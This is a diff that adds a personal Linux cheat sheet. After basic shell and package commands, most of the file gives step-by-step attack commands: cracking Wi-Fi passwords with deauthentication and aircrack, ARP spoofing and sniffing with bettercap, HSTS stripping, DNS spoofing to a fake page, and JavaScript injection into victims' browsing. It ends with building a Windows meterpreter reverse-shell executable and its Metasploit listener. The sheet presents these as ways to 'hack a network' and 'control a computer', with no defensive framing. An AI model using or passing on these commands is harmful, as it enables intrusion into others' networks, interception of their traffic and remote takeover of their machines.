@@ -1,0 +1,119 @@
+pwd													=> the current directory
+ls													=> list files and folders
+ls path													=> list files and folders in this path
+clear													=> clear the terminal
+echo text												=> print the text in terminal
+date													=> return the date
+whoami													=> return the username
+uname -n												=> the machine you work in
+history													=> history of your commands
+!number													=> run command with this number in history
+varName=value												=> declare a global vairable
+$varName												=> use this variable
+which command												=> return the path of the command
+type command												=> return the type of the command
+alias													=> return all shortcut commands
+type -a command												=> all the data about the command
+info command												=> info page of the command
+command --help												=> help page of the command
+cd path													=> enter the path
+cp path1 path2												=> copy from path one to path two
+touch fileName												=> create a file
+rm fileName												=> remove a file
+mkdir folderName											=> make a directory
+rmdir folderName											=> remove a directory
+nano fileName												=> edit a file
+========================================================================================================
+sudo apt install appName										=> install an application
+sudo dpkg -i fileName.extension										=> install an application from a package
+sudo apt update && sudo apt full-upgrade								=> update and upgrade the system
+sudo apt remove appName											=> remove an application
+sudo dpkg -r appName											=> remove an application
+sudo dpkg --purge packageName										=> remove an application with details
+apt list --installed											=> list installed applications
+sudo updatedb												=> update the database of the system
+sudo update-grub											=> update grub configuration
+========================================================================================================
+// restart a service
+systemctl restart bluetooth										=> restart the bluetooth
+systemctl start NetworkManager										=> start a network manager
+========================================================================================================
+// to hack a network
+sudo airmon-ng start wlan0										=> start monitor mode
+sudo airmon-ng check kill										=> kill any network process in background
+iwconfig												=> return data about every network around
+sudo airodump-ng wlan0mon										=> start airdump service
+sudo airodump-ng wlan0mon -w savePath -c channelNumber --bssid macAddress 				=> to write the handshake file // now wait till someone connect to the network
+sudo aireplay-ng --deauth 0 -a networkMacAddress wlan0mon 						=> to reject who are connected to the network (help the previous step)
+sudo aircrack-ng -b macAddress the.capFile -w thePasswordsFile						=> to start cracking the file .cap
+sudo airmon-ng stop wlan0mon										=> to stop the monitor mode
+sudo systemctl restart NetworkManager									=> to restart the wifi service work
+// you can just enter fern-wifi-cracker application
+========================================================================================================
+crunch min max -t pattern -o savePath									=> to create file from all possible passwords // pattern   => % number    @ letter
+========================================================================================================
+// to know the devices connected to the same network
+sudo netdiscover -r 192.168.1.1/24
+sudo nmap 192.168.1.1/24
+sudo nmap -sS 198.168.1.1/24
+========================================================================================================
+// to use better cap
+sudo apt install bettercap
+net.probe on 												=> turn on net.probe
+net.show 												=> show all devices connected to you or you connected for
+set arp.spoof.fullduplex true  										=> attack the router and the target
+set arp.spoof.targets targetIP 										=> define the target
+arp.spoof on 												=> turn on the attack
+net.sniff on 												=> to start observing activity in the network
+========================================================================================================
+sudo arpspoof -i wlan0 -t targetIP routerIP  								// be the router for the target
+sudo arpspoof -i wlan0 -t routerIP targetIP  								// be the device for the router
+sudo su 			             								// to turn into root mode
+echo 1 > /proc/sys/net/ipv4/ip_forward       								// to send and recieve requests
+========================================================================================================
+// change the https to http protocol while spying the network
+sudo bettercap
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets targetIP
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+hstshijack/hstshijack
+========================================================================================================
+// to spy using the website the victim enter (change the direction to your own special page)
+service apache2 start    										// to change your self to a server you can change the content of the page by editing the html file in directory /var/www/html/index.html
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets targetIP
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+set dns.spoof.address YourIP
+set dns.spoof.all true
+set dns.spoof.domains theTargetedWebsite 								// the website when the victim enter direct him to my server
+dns.spoof on
+========================================================================================================
+// javascript injection attack
+// after getting javascript file ready in hstshijack/hstshijack by editing the set /usr/share/bettercap/caples/hstshijack/            hstshijack.payloads add the text "*:JavascriptFilePath"
+sudo su
+sudo bettercap
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets targetIP
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+hstshijack/hstshijack
+========================================================================================================
+// to control a computer
+// app name  port type/nuclear/converter/connectionType host=YourIP port=8080 -f TypeOfTheFile -o savePath
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=8080 -f exe -o /home/kamal/Desktop/hack.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST YourIP
+set LPORT 8080
+run   or   exploit
+========================================================================================================
+
